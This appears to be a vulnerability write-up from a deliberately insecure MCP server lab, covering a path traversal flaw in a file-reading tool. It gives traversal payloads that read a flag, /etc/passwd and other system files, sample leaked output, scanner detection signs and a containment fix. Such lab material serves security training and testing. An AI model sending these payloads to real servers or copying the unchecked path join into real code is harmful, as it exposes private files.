# Path Traversal — CWE-22

## Description

The `filename` parameter is joined onto the data directory path using `os.path.join`
without validating that the resulting path stays within the intended directory.
`../` sequences are followed by the OS, allowing access to any readable file on the filesystem.

## Vulnerable Code

```python
# tools/path_traversal.py
DATA_DIR = "/app/data"
target = os.path.join(DATA_DIR, filename)  # no containment check
with open(target) as fh:
    return fh.read()
```

The resolved path is returned in error messages, aiding reconnaissance.

## Example MCP Call (benign)

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "read_file",
    "arguments": {"filename": "secret.txt"}
  },
  "id": 1
}
```

## Attack Payloads

### Read the flag (one level up)
```
../flag.txt
```
Returns: `EVMCP_FLAG=EVMCP{path_traversal_escaped_the_data_directory}`

### Read Linux passwd file
```
../../../etc/passwd
```

### Read the SQLite database (binary)
```
users.db
```

### Absolute path (bypasses join entirely)
```
/etc/hostname
```
`os.path.join("/app/data", "/etc/hostname")` returns `/etc/hostname` — the base is discarded.

## Expected Response (passwd)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## ZAP Detection

ZAP's Path Traversal active scanner should detect:
- Response contains `root:x:0:0` or similar passwd file content
- Response contains absolute path in error messages revealing filesystem layout
- `EVMCP_FLAG=` string in response for the flag file

## Secure Fix

Verify the resolved path starts with the allowed base directory:

```python
import os
DATA_DIR = os.path.realpath("/app/data")
target = os.path.realpath(os.path.join(DATA_DIR, filename))
if not target.startswith(DATA_DIR + os.sep):
    return "Access denied"
with open(target) as fh:
    return fh.read()
```
